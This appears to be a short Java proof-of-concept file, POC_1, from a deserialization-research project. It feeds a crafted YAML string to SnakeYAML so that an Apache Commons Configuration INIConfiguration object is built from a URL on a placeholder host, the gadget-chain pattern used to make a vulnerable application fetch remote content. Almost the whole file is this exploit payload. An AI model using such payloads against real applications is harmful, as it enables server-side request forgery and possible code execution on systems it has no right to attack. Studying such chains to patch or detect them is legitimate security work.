package com.example.CC;

import com.example.Utils.*;

public class POC_1 {

    public static void main(String[] args) throws Exception {
        String poc = "? !!org.apache.commons.configuration.INIConfiguration [!!java.net.URL [\"http://xxx\"]]";
        SnakeYaml.deserialize(poc);
    }

}